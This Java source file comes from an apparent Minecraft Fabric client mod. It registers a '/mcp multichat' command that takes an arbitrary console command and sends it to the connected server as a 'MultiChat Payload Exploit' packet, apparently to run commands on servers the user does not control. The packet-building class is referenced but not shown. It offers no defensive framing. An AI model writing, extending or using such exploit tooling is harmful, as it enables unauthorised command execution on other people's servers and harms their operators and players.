package dev.wrrulosdev.mcpclient.client.commands.cmd;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.suggestion.Suggestions;
import com.mojang.brigadier.suggestion.SuggestionsBuilder;
import dev.wrrulosdev.mcpclient.client.commands.Command;
import dev.wrrulosdev.mcpclient.client.constants.ClientConstants;
import dev.wrrulosdev.mcpclient.client.payloads.MultiChatPayloadPacket;
import dev.wrrulosdev.mcpclient.client.payloads.NLoginPayloadPacket;
import dev.wrrulosdev.mcpclient.client.utils.messages.Msg;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import java.util.Objects;
import java.util.concurrent.CompletableFuture;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;

public class MultiChatExploitCommand implements Command {

    /**
     * Registers the multichat command with the client command system.
     *
     * @return a LiteralArgumentBuilder used to register the multichat command.
     */
    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> register() {
        return literal("multichat")
            .executes(this::executeRoot)
            .then(argument("consoleCommand", StringArgumentType.greedyString())
                .suggests(this::suggestUsernames)
                .executes(this::executeMultiChat));
    }

    /**
     * Provides autocompletion suggestions for player names.
     *
     * @param context The command context.
     * @param builder The suggestion builder.
     * @return A CompletableFuture with the suggestions.
     */
    private CompletableFuture<Suggestions> suggestUsernames(CommandContext<FabricClientCommandSource> context, SuggestionsBuilder builder) {
        String input = builder.getRemaining().toLowerCase();
        int lastSpaceIndex = input.lastIndexOf(' ');
        String prefix = lastSpaceIndex == -1 ? "" : input.substring(0, lastSpaceIndex + 1);
        String filter = (lastSpaceIndex == -1) ? input : input.substring(lastSpaceIndex + 1).toLowerCase();
        MinecraftClient client = MinecraftClient.getInstance();

        if (client.getNetworkHandler() != null) {
            client.getNetworkHandler().getPlayerList().stream()
                .map(entry -> entry.getProfile().getName())
                .filter(Objects::nonNull)
                .filter(name -> name.toLowerCase().startsWith(filter))
                .forEach(name -> builder.suggest(prefix + name));
        }

        return builder.buildFuture();
    }

    /**
     * Handles the case where no arguments are provided.
     *
     * @param context The command context.
     * @return Always returns 0 (success).
     */
    private int executeRoot(CommandContext<FabricClientCommandSource> context) {
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&cUsage: /mcp multichat <consoleCommand>");
        return 0;
    }

    /**
     * Executes the command when arguments are provided.
     *
     * @param context The command context.
     * @return Always returns 0 (success).
     */
    private int executeMultiChat(CommandContext<FabricClientCommandSource> context) {
        String command = StringArgumentType.getString(context, "consoleCommand");
        Msg.sendFormattedMessage(ClientConstants.PREFIX + "&aSending the &fMultiChat &aPayload Exploit to the server...");
        MultiChatPayloadPacket.send(command);
        return 0;
    }
}
